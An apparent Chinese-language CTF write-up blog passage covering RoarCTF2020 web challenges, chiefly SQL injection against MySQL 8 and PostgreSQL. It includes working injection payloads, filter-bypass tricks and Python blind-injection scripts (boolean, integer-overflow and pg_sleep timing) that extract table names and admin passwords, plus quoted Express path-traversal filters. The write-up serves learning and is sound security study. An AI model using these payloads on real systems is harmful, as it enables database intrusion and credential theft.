<p>经过简单的搜索发现了两个在关闭所有权限下仍然能进行的操作。分别是创建子进程和读取和class同目录及子目录下的文件<br>但是创建的子进程也同样受到security manager的超级限制，能下手的地方似乎只有文件读取？简单测试之后发现是可以读取软链接的，即使软链接指向的文件不在当前目录下。这让我想起了那个经典zip压缩软链接的操作。而jar包其实就是一个zip，往里面多塞一个软链接也不会影响解析，编译也能通过。似乎是一个很好的主意</p>
<p>然后编译出来之后发现java读zip中的软链接会只能读出来文件名，无法读取软链接的内容，搜索了一下之后发现好像的确如此，躺平了。。。不会</p>
<p>现在想起来这个是pwn题，而输入就是给python的两个文件，不会是这里能pwn一下吧。。。</p>
<h3 id="看wp"><a href="#看wp" class="headerlink" title="看wp"></a>看wp</h3><p>看完之后说这个security manager无敌防御，打不进去的。有问题的点在于那个编译环节，使用dep.jar进行编译时如果对编译时操作进行额外设置，可以在编译过程中进行rce。完全不知道有这种事啊。我是菜狗</p>
<p>直接看r3的wp好了<br>躺<br><a href="https://r3kapig.com/writeup/20220125-rwctf4/">r3kapig wp</a></p>
]]></content>
      <categories>
        <category>刷题记录</category>
      </categories>
      <tags>
        <tag>wp</tag>
        <tag>SQLI</tag>
        <tag>htaccess</tag>
      </tags>
  </entry>
  <entry>
    <title>[RoarCTF2020]wp</title>
    <url>/%5BRoarCTF2020%5Dwp.html</url>
    <content><![CDATA[<h1 id="RoarCTF2020-wp"><a href="#RoarCTF2020-wp" class="headerlink" title="[RoarCTF2020]wp"></a>[RoarCTF2020]wp</h1><p>Y1ng是嘶吼的出题人之一，很久以前就在buu群里说这次嘶吼请你吃SQL注入大礼包，我算是吃饱了<br>虽然我都不会做，但是我吃到了超级SQL注入大礼包，注吐了，不过还是学到一点点东西，以及我是SQL注入废物</p>
<h2 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h2><p>ssrf，先看源码正则匹配过滤flag，但是curl存在二次编码的问题，直接file协议加二次编码绕过读flag</p>
<h2 id="ezsql"><a href="#ezsql" class="headerlink" title="ezsql"></a>ezsql</h2><p>测了一下发现username处可以注入，password处注不动，username是admin就会出password error，否则就username error<br>ban了空格和select，空格可以用&#x2F;**&#x2F;直接绕</p>
<h3 id="盲注跑password"><a href="#盲注跑password" class="headerlink" title="盲注跑password"></a>盲注跑password</h3><p>因为username和password看到在同一张表下，不用select也可以盲注一下password<br><code>username=a&#39;/**/or/**/substr(password,&#123;&#125;,1)=&#39;&#123;&#125;&#39;#</code><br>这里踩了几个坑，第一个是等号后面一开始没用引号。。。。字符串和0比较均为true，导致注入结果奇奇怪怪的，第二个是substr要从1开始，从0会选出一位奇奇怪怪的东西</p>
<p>不过由于concat是把符合条件的所有列给选出来，所有如果用户表里面存在多个用户的话，上面的盲注可能会导致把别的用户的密码当做admin密码，所以需要再加一个限制条件（这个题就这一个用户，所以就上面这个注入也能注出来）</p>
<p>这也是第三个坑，concat和group_concat存在一定的区别，本地测试的时候可以<code>select substr(group_concat(password),1,1) from users;</code>这样子是把整个password表用逗号连接起来，而<code>select substr(concat(password),1,1) from users;</code>则是选出了password表每一列的第一个字母，而把payload改成注入格式的<code>select * from users where username=&#39;1&#39; or substr(concat(password),1,1)=&#39;a&#39;;</code>后，group_concat会直接报错，concat还能用</p>
<p>使用如下payload能指定只注admin的password<br><code>select * from users where username=&#39;1&#39; or substr(concat(username,&#39;,&#39;, password),1,&#123;&#125;)=&#39;&#123;&#125;&#39;</code></p>
<p>最终跑出来密码是个md5，这也解释了为什么password注不了，放到cmd5里面解密一下，gml666，登录<br>Login success，No flag<br>浪费我感情</p>
<h3 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h3><p>师傅和我说是堆叠注入，把常见的堆叠语句都ban了<br>prepare execute handler select update insert drop show<br>反正就是一无所有</p>
<p>先回顾一下堆叠<br>堆叠之前学过的操作就是用set定义一个字符串变量，而字符串变量可以用concat来绕过过滤，再用prepare对字符串进行预处理变成一个statement，execute执行字符串</p>
<p>handler是MySQL独有的语句，代替select的，功能就是打开一个表，然后返回一个句柄，一行一行读</p>
<pre><code>handler table_name open;
handler table_name read first;
handler table_name reand next;
</code></pre>
<p>然而他们都没了<br>吃了个午饭，分号突然也没了？？？还带临时改题的？？？</p>
<h3 id="MySQL8新操作"><a href="#MySQL8新操作" class="headerlink" title="MySQL8新操作"></a>MySQL8新操作</h3><p>最后还是看MySQL8的全新操作，table语句和value语句<br>按着这个大哥的做法来做<br><a href="https://0xgeekcat.github.io/%E5%88%A9%E7%94%A8MySQL8%E6%96%B0%E7%89%B9%E6%80%A7%E7%BB%95%E8%BF%87select%E8%BF%87%E6%BB%A4.html">利用MySQL8新特性绕过select过滤</a></p>
<p>先用上面的盲注可以把db整出来，就叫ctf<br>mysql的查询结果似乎是通过字母顺序排的<br>而ctf这个数据库名开头是c，系统库没有开头是ab的，所以可以使用order by table_schema直接将其排序到第一(以前我一直不知道table_schema存的就是数据库名，虽然有时候有table_schema&#x3D;database()这样的语句但是没仔细想过。。。。)<br>所以<code>TABLE/**/information_schema.tables/**/order/**/by/**/table_schema/**/limit/**/0,1</code>就能取得ctf库的所有信息了<br>本地看一下information_schema.tables都有哪些列<code>show columns from information_schema.tables;</code></p>
<pre class=" language-mysql"><code class="language-mysql">+-----------------+---------------------+------+-----+---------+-------+
| Field           | Type                | Null | Key | Default | Extra |
+-----------------+---------------------+------+-----+---------+-------+
| TABLE_CATALOG   | varchar(512)        | NO   |     |         |       |
| TABLE_SCHEMA    | varchar(64)         | NO   |     |         |       |
| TABLE_NAME      | varchar(64)         | NO   |     |         |       |
| TABLE_TYPE      | varchar(64)         | NO   |     |         |       |
| ENGINE          | varchar(64)         | YES  |     | NULL    |       |
| VERSION         | bigint(21) unsigned | YES  |     | NULL    |       |
| ROW_FORMAT      | varchar(10)         | YES  |     | NULL    |       |
| TABLE_ROWS      | bigint(21) unsigned | YES  |     | NULL    |       |
| AVG_ROW_LENGTH  | bigint(21) unsigned | YES  |     | NULL    |       |
| DATA_LENGTH     | bigint(21) unsigned | YES  |     | NULL    |       |
| MAX_DATA_LENGTH | bigint(21) unsigned | YES  |     | NULL    |       |
| INDEX_LENGTH    | bigint(21) unsigned | YES  |     | NULL    |       |
| DATA_FREE       | bigint(21) unsigned | YES  |     | NULL    |       |
| AUTO_INCREMENT  | bigint(21) unsigned | YES  |     | NULL    |       |
| CREATE_TIME     | datetime            | YES  |     | NULL    |       |
| UPDATE_TIME     | datetime            | YES  |     | NULL    |       |
| CHECK_TIME      | datetime            | YES  |     | NULL    |       |
| TABLE_COLLATION | varchar(32)         | YES  |     | NULL    |       |
| CHECKSUM        | bigint(21) unsigned | YES  |     | NULL    |       |
| CREATE_OPTIONS  | varchar(255)        | YES  |     | NULL    |       |
| TABLE_COMMENT   | varchar(2048)       | NO   |     |         |       |
+-----------------+---------------------+------+-----+---------+-------+
</code></pre>
<p>共21列，看了一眼本地库的第一项TABLE_CATALOG都是def，而第二项就是库名，第三项就是表名，因此很好构造出一个元组</p>
<h4 id="获取表名"><a href="#获取表名" class="headerlink" title="获取表名"></a>获取表名</h4><p>利用上面大哥链接的对比方法，构造出语句<br><code>(&#39;def&#39;,&#39;ctf&#39;,&#39;&#123;&#125;&#39;,&#39;&#39;,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,&#39;&#39;)&lt;=(TABLE/**/information_schema.tables/**/order/**/by/**/table_schema/**/limit/**/0,1)</code><br>就算order by整出来不是第一个，我就强行遍历limit数据库名能对应ctf应该也没问题吧</p>
<p>记得匹配的时候要-1，忘了这个试了半天不知道什么情况(具体见文末脚本)<br>跑出来一个表admin，显然是一开始盲注的时候用户名密码那个表</p>
<p>跑第二个表<br>一开始按ascii码顺序遍历，出现了一堆奇怪的字符导致错误。。。最后按ascii码顺序手打了一个字符集跑出来flag表名为f11114g</p>
<h3 id="元组对比获取列数"><a href="#元组对比获取列数" class="headerlink" title="元组对比获取列数"></a>元组对比获取列数</h3><p>这个元组比较的做法有一个好处，不需要列名了，直接比较就能打，并且能通过比对项目来判断列数<br>手测列数<br><code>a&#39;||(&#39;&#39;,&#39;&#39;)&lt;=(TABLE/**/f11114g/**/limit/**/0,1))#</code><br>两列直接出username error，所以就一列，列数不一致直接报错</p>
<pre class=" language-mysql"><code class="language-mysql">mysql> select ('')<('1');
+------------+
| ('')<('1') |
+------------+
|          1 |
+------------+
1 row in set (0.00 sec)

mysql> select ('')<('1','');
ERROR 1241 (21000): Operand should contain 1 column(s)
mysql> select ('','')<('1','');
+------------------+
| ('','')<('1','') |
+------------------+
|                1 |
+------------------+
1 row in set (0.00 sec)

mysql> select ('','','')<('1','');
ERROR 1241 (21000): Operand should contain 3 column(s)
</code></pre>
<p>也可以如法炮制的获取列名<br><code>a&#39;||((&#39;def&#39;,&#39;ctf&#39;,&#39;f11114g&#39;,&#39;z&#39;,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,0,0,0,0)&lt;=(TABLE/**/information_schema.columns/**/order/**/by/**/table_schema/**/limit/**/3,1))#</code>同样需要本地获取一下columns的列数，一开始用的本地mysql5.6的远古环境，得到的列数是19，怎么整都整不对，最后临时拉了一个mysql8.0的docker，发现8.0里面是22列。。。得到f11114g的列就一个，为f1lllaggf<br>但是在用table语句的情况下，这个列名也没锤子用，不需要知道列名，就把f11114g改成f11114gg，再把limit加个1，发现又变成username error就知道只有一列了</p>
<h4 id="获取flag"><a href="#获取flag" class="headerlink" title="获取flag"></a>获取flag</h4><p><code>a&#39;||((&#39;&#123;&#125;&#39;)&lt;=binary(TABLE/**/f11114g/**/limit/**/1,1))#</code><br>第一个是个假flag，第二个是真的，记得用binary区分大小写<br>然后字符集还得改一下，因为要往前退一位，所以得加点东西，脚本如下</p>
<h3 id="注入脚本"><a href="#注入脚本" class="headerlink" title="注入脚本"></a>注入脚本</h3><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requests

url <span class="token operator">=</span> <span class="token string">"http://139.129.98.9:30003/login.php"</span>
payload <span class="token operator">=</span> <span class="token string">""</span>
charset <span class="token operator">=</span> <span class="token string">"-.0123456789:ABCDEFGHIJKLMNOPQRSTUVWXYZ_`abcdefghijklmnopqrstuvwxyz{|}~"</span>

table_name <span class="token operator">=</span> <span class="token string">""</span>

<span class="token keyword">for</span> n <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> charset<span class="token punctuation">:</span>
        payload <span class="token operator">=</span> "a<span class="token string">'||(('</span><span class="token punctuation">{</span><span class="token punctuation">}</span>'<span class="token punctuation">)</span><span class="token operator">&lt;=</span>binary<span class="token punctuation">(</span>TABLE<span class="token operator">/</span><span class="token operator">**</span><span class="token operator">/</span>f11114g<span class="token operator">/</span><span class="token operator">**</span><span class="token operator">/</span>limit<span class="token operator">/</span><span class="token operator">**</span><span class="token operator">/</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#".format(table_name+i)</span>
        data <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"username"</span><span class="token punctuation">:</span> payload<span class="token punctuation">,</span> <span class="token string">"password"</span><span class="token punctuation">:</span> <span class="token string">"1"</span><span class="token punctuation">}</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span>
        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token punctuation">)</span>
        <span class="token keyword">if</span> <span class="token string">"username"</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
            <span class="token comment" spellcheck="true"># print(r.text)</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>
            table_name <span class="token operator">+=</span> chr<span class="token punctuation">(</span>ord<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>
            <span class="token keyword">break</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>table_name<span class="token punctuation">)</span>
</code></pre>
<p>拿到flag</p>
<p>我是SQL注入垃圾呜呜呜</p>
<h2 id="你能登陆成功吗"><a href="#你能登陆成功吗" class="headerlink" title="你能登陆成功吗"></a>你能登陆成功吗</h2><p>SQL注入大礼包，我服了，是没见过的postgreSQL，配合express写的，还是没学过的整数溢出注入<br>开局给的hint<code>let PostgreSQL = `SELECT * FROM users WHERE username= &#39;$&#123;username&#125;&#39; AND password= &#39;$&#123;password&#125;&#39;` </code><br>用户名限制死了admin，在password处注入，会回显注入语句，但是没闭合引号就不会回显语句，约等于语句出错不回显语句<br>万能密码登录失败，不知道为什么<br>开始学习整数溢出注入</p>
<h3 id="整数溢出注入"><a href="#整数溢出注入" class="headerlink" title="整数溢出注入"></a>整数溢出注入</h3><p>也分两种，一种是基于报错回显的整数溢出注入，另一种就是盲注<br>报错回显的如下所示</p>
<pre class=" language-mysql"><code class="language-mysql">mysql> select ~0;
+----------------------+
| ~0                   |
+----------------------+
| 18446744073709551615 |
+----------------------+
1 row in set (0.00 sec)

mysql> select ~0+1;
ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in '(~(0) + 1)'
mysql> select !(select*from(select user())x);
+--------------------------------+
| !(select*from(select user())x) |
+--------------------------------+
|                              1 |
+--------------------------------+
1 row in set (0.01 sec)

mysql> select ~0+!(select*from(select user())x); 
ERROR 1690 (22003): BIGINT value is out of range in '(~(0) + (not((select 'root@localhost' from dual))))'
</code></pre>
<p>似乎mysql大于5.5.5才能用，本地5.5.53测试的时候就不行(虽然我感觉这个版本号好像比5.5.5大)，不过报错还是会报，然后换了昨天的mysql8，也不行，前几步都一致，最后报错这步带不出数据</p>
<pre class=" language-mysql"><code class="language-mysql">mysql> select ~0+!(select*from(select user())x);
ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in '(~(0) + (0 = (select `x`.`user()` from (select user() AS `user()`) `x`)))'
</code></pre>
<p>不过总归报错还报得出来的，虽然今天这个题不是MySQL，但是还是能就基于报错时无回显语句进行一个整数溢出盲注，学习一下语法</p>
<p>学习完毕，好像这个操作也没什么新颖的，就和普通的bool盲注没什么区别，这里选择它是因为回显只有报错和不报错两种</p>
<h3 id="payload基本框架构造"><a href="#payload基本框架构造" class="headerlink" title="payload基本框架构造"></a>payload基本框架构造</h3><p>不过需要使用postgresql的语句进行注入，先上官方文档查一下，查出来它的最大整数为9223372036854775807，开始构造语句</p>
<p><code>password=1&#39;/**/or/**/select(9223372036854775807+(条件)=1)--/**/</code></p>
<p>postgresql的if是这么写的</p>
<pre class=" language-mysql"><code class="language-mysql">CASE WHEN condition THEN result
     [WHEN ...]
     [ELSE result]
END
</code></pre>
<p>所以条件那写一个<code>case/**/when/**/()/**/then(0)else(1)end</code><br>在when里面做最终判断就行了<br>then 0 else 1要优于then 1 else 0<br>因为选择前者，当你执行结果为真的时候不会报错，执行为假或语句有误的时候产生报错，后者则会导致不知道是<strong>执行结果为真还是语句写错了</strong>导致了报错</p>
<h3 id="数据库存在判断"><a href="#数据库存在判断" class="headerlink" title="数据库存在判断"></a>数据库存在判断</h3><p>没有太多的过滤内容，就按照postgresql的正常注入顺序就可以了<br><code>(select/**/count(*)/**/from/**/pg_stat_user_tables)/**/between/**/1/**/and/**/1</code><br>判断这个表是不是存在，一般来说是用来确认数据库类型的，不过这里给出了数据库类型</p>
<p>pg_stat_user_tables和mysql的information_schema比较类似(我也不清楚)</p>
<h3 id="获取表名-1"><a href="#获取表名-1" class="headerlink" title="获取表名"></a>获取表名</h3><p>再用realname来查询表名</p>
<p><code>(select/**/ascii(substr(relname,1,1))/**/from/**/pg_stat_user_tables/**/limit/**/1/**/OFFSET/**/0)between/**/32/**/and/**/127</code><br>还要自己写二分。。。太致命了</p>
<p>翻到了以前写的二分脚本，修修补补就能用，爽死了</p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requests

url <span class="token operator">=</span> <span class="token string">"http://139.129.98.9:30005/"</span>
result <span class="token operator">=</span> <span class="token string">""</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    p <span class="token operator">=</span> <span class="token number">0</span>
    q <span class="token operator">=</span> <span class="token number">256</span>
    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
        m <span class="token operator">=</span> <span class="token punctuation">(</span>p <span class="token operator">+</span> q<span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token number">2</span>
        payload <span class="token operator">=</span> <span class="token string">"1'or(select(9223372036854775807+(case/**/when/**/("</span> \
                  <span class="token string">"(select/**/ascii(substr(relname,{},1))/**/from/**/pg_stat_user_tables/**/limit/**/1/**/OFFSET/**/0)between/**/{}/**/and/**/127"</span> \
                  <span class="token string">")/**/then(0)else(1)end))=1)--/**/"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>str<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span>
        data <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"username"</span><span class="token punctuation">:</span> <span class="token string">"admin"</span><span class="token punctuation">,</span> <span class="token string">"password"</span><span class="token punctuation">:</span> payload<span class="token punctuation">}</span>
        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token punctuation">)</span>
        <span class="token keyword">if</span> <span class="token string">"9223372036854775807"</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>  <span class="token comment" spellcheck="true"># 条件中结果为真</span>
            p <span class="token operator">=</span> m
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            q <span class="token operator">=</span> m
        <span class="token keyword">if</span> p <span class="token operator">+</span> <span class="token number">1</span> <span class="token operator">==</span> q<span class="token punctuation">:</span>
            result <span class="token operator">+=</span> chr<span class="token punctuation">(</span>p<span class="token punctuation">)</span>
            <span class="token keyword">break</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span>
</code></pre>
<p>表名users，提示里也有，我就走个流程</p>
<h3 id="获取列名"><a href="#获取列名" class="headerlink" title="获取列名"></a>获取列名</h3><p>获取列名，用的居然是information_schema，和MySQL一个操作<br><code>(select/**/ascii(substr(column_name,&#123;&#125;,1))/**/from/**/information_schema.columns/**/where/**/table_name=&#39;users&#39;/**/limit/**/1/**/OFFSET/**/0)between/**/&#123;&#125;/**/and/**/127</code><br>列名是id,username,password，提示里也有。。</p>
<h3 id="查字段"><a href="#查字段" class="headerlink" title="查字段"></a>查字段</h3><p><code>(select/**/ascii(substr(password,&#123;&#125;,1))/**/from/**/users/**/where/**/username=&#39;admin&#39;/**/limit/**/1/**/OFFSET/**/0)between/**/&#123;&#125;/**/and/**/127</code><br>跑出来 Pg5QL1sF4ns1N4T1n9<br>抽象大师，我大概看懂了说的是pgsql is fansinating<br>登录获取flag</p>
<h2 id="你能登陆成功吗-Revenge"><a href="#你能登陆成功吗-Revenge" class="headerlink" title="你能登陆成功吗-Revenge"></a>你能登陆成功吗-Revenge</h2><p>。就是基于不报错的时候会回显语句这个操作的整数溢出注入是非预期。。。实际上是一个时间盲注，没加过滤，就是无论语句咋样最后都不返回查询语句了<br>postgresql的where和MySQL的不一样，MySQL直接<code>where id=1 or sleep(5)</code>是跑得起来的，而postgresql的where后面必须得是个bool表达式，而其sleep函数pg_sleep()的返回值是void，不行</p>
<p>抄了一个payload，外面多套一层strpos，然后在if语句里面sleep，strpos返回一个bool值即可，通过延时来判断<br><a href="https://answer-id.com/zh/51434394">https://answer-id.com/zh/51434394</a> 九年前的远古操作了<br>稍微改一下payload</p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requests
<span class="token keyword">import</span> time

url <span class="token operator">=</span> <span class="token string">"http://139.129.98.9:30007/"</span>
result <span class="token operator">=</span> <span class="token string">""</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token comment" spellcheck="true"># 二分查找提高效率</span>
    p <span class="token operator">=</span> <span class="token number">0</span>
    q <span class="token operator">=</span> <span class="token number">256</span>
    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
        m <span class="token operator">=</span> <span class="token punctuation">(</span>p <span class="token operator">+</span> q<span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token number">2</span>
        payload <span class="token operator">=</span> <span class="token string">"1'or(strpos((select/**/case/**/when/**/("</span> \
                  <span class="token string">"(select/**/ascii(substr(password,{},1))/**/from/**/users/**/where/**/username='admin'/**/limit/**/1/**/OFFSET/**/0)between/**/{}/**/and/**/127"</span> \
                  <span class="token string">")/**/then(pg_sleep(3))else(pg_sleep(0))end)::text,'1')=0)--/**/"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>str<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token comment" spellcheck="true"># print(m)</span>
        data <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"username"</span><span class="token punctuation">:</span> <span class="token string">"admin"</span><span class="token punctuation">,</span> <span class="token string">"password"</span><span class="token punctuation">:</span> payload<span class="token punctuation">}</span>
        start <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>
        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token punctuation">)</span>
        end <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
        <span class="token keyword">if</span> end<span class="token operator">-</span>start <span class="token operator">></span> <span class="token number">2</span><span class="token punctuation">:</span>  <span class="token comment" spellcheck="true"># 条件中结果为真</span>
            p <span class="token operator">=</span> m
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            q <span class="token operator">=</span> m
        <span class="token keyword">if</span> p <span class="token operator">+</span> <span class="token number">1</span> <span class="token operator">==</span> q<span class="token punctuation">:</span>
            result <span class="token operator">+=</span> chr<span class="token punctuation">(</span>p<span class="token punctuation">)</span>
            <span class="token keyword">break</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span>
</code></pre>
<p>数据库结构肯定没变，直接梭最后的密码，不然时间盲注还等你慢慢注注老了<br>这把的密码变成了S0rryF0Rm1st4ke111<br>sorry for mistake</p>
<p>这个解算是非预期，虽然也是很正常的操作吧。。。因为把pg_sleep()强制转到文本了然后作比较就能返回bool，看Y1ng的意思应该是在then里面不直接写pg_sleep，而是再来一层(select 123 from pg_sleep(5))，这种语句是可以的，并且返回数字123</p>
<p>我又学会一点东西呜呜</p>
<h2 id="badhack"><a href="#badhack" class="headerlink" title="badhack"></a>badhack</h2><p>看了一眼，说是个web题，其实是个RE，变量命名都是寄存器，然后一通移位异或各种操作，真当我没见过RE爷爷做题的时候什么样子吗，直接进行一个跳过<br>今天RE爷爷都咕了呜呜</p>
<h2 id="HTML在线代码编辑器"><a href="#HTML在线代码编辑器" class="headerlink" title="HTML在线代码编辑器"></a>HTML在线代码编辑器</h2><p>express写的，功能就是在线运行HTML代码，view路由有一个file参数可以看文件<br>参数前面拼接了目录，..出现就被ban，感觉也没机会目录穿越啊，没时间了，结束了</p>
<p>看了wp，有点被搞的感觉，view路由支持post和get两种方法，get方法过滤了..，但是post没有，就可以任意文件读取了？？？？？？<br>虽然说这个点是通过看前端发现有POST方式访问的，但是get post两种方式不同过滤可真是小天才<br>get的过滤</p>
<pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">if</span> <span class="token punctuation">(</span>req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>is_login <span class="token operator">!==</span> <span class="token number">1</span> <span class="token operator">||</span> <span class="token operator">!</span>req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>file <span class="token operator">||</span> <span class="token keyword">typeof</span> req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>file <span class="token operator">!==</span> <span class="token string">'string'</span> <span class="token operator">||</span> req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>file<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token string">'..'</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>
</code></pre>
<p>post的过滤</p>
<pre class=" language-javascript"><code class="language-javascript">        <span class="token keyword">if</span> <span class="token punctuation">(</span>req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>is_login <span class="token operator">!==</span> <span class="token number">1</span>
            <span class="token operator">||</span> <span class="token operator">!</span>req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>file
            <span class="token operator">||</span> <span class="token keyword">typeof</span> req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>file <span class="token operator">!==</span> <span class="token string">'string'</span>
            <span class="token operator">||</span> req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>file<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token string">'proc'</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token operator">-</span><span class="token number">1</span>
            <span class="token operator">||</span> req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>file<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token string">'environ'</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token operator">-</span><span class="token number">1</span>
            <span class="token operator">||</span> <span class="token operator">!</span>req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>time
            <span class="token operator">||</span>  <span class="token punctuation">(</span> Math<span class="token punctuation">.</span><span class="token function">abs</span><span class="token punctuation">(</span>Math<span class="token punctuation">.</span><span class="token function">ceil</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Date</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getTime</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">1000</span><span class="token punctuation">)</span> <span class="token operator">-</span> req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>time<span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
</code></pre>
<p>真是小天才</p>
<p>然后是一个SSTI，js的SSTI不会整<br>等buu上题之后再去复现吧</p>
<h2 id="快乐圣诞cei叮壳"><a href="#快乐圣诞cei叮壳" class="headerlink" title="快乐圣诞cei叮壳"></a>快乐圣诞cei叮壳</h2><p>这个题看了好久，源码超级长，最后还有一步注入，吐了，但是在注入前的一段就已经卡住了，不会做了</p>
<pre class=" language-javascript"><code class="language-javascript">    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>req<span class="token punctuation">.</span>body <span class="token operator">||</span> <span class="token keyword">typeof</span> req<span class="token punctuation">.</span>body <span class="token operator">!==</span> <span class="token string">'object'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        res<span class="token punctuation">.</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span>
    <span class="token punctuation">}</span>

    player <span class="token operator">=</span> <span class="token punctuation">{</span>
        name<span class="token punctuation">:</span> <span class="token string">"player"</span><span class="token punctuation">,</span>
        award<span class="token punctuation">:</span> <span class="token string">"Turkey"</span><span class="token punctuation">,</span>
        want_to_eat<span class="token punctuation">:</span> <span class="token string">"1"</span><span class="token punctuation">,</span>
    <span class="token punctuation">}</span>

    req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>name <span class="token operator">=</span> <span class="token string">"player"</span>
    req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>award <span class="token operator">=</span> <span class="token string">"Turkey"</span>
    req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>want_to_eat <span class="token operator">=</span> <span class="token string">"1"</span>

    <span class="token keyword">let</span> tempPlayer <span class="token operator">=</span> req<span class="token punctuation">.</span>body

    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token keyword">in</span> tempPlayer<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>player<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
